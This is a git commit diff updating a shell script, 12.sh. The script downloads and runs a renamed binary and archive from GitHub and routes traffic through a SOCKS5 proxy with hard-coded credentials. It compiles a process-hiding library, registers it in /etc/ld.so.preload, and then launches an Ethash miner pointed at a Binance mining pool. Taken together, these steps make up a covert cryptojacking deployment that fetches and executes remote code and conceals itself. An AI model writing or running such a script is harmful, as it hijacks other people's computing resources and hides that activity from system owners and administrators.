2e9a2dcb722e9d8fb29a53e4a64007a394a8c700
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-24 08:51:07 -0600

    Update 12.sh

--- 12.sh
+++ 12.sh
@@ -2,45 +2,34 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 = 18.223.155.101:1080
+socks5_username = sempakcok
+socks5_password = gunturmanis
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek
 
-sleep .2
+chmod +x pepek
 
-echo " "
-echo " "
+wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip
 
-echo " "
+unzip pepek.zip
 
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo " "
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
 make
+
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
 mv libprocesshider.so /usr/local/lib/
+
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=teguhcong.$(echo $(shuf -i 1-99999 -n 1)-KENT)@stratum+tcp://ethash.poolbinance.com:1800 >/dev/null 2>&1
+./pepek --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
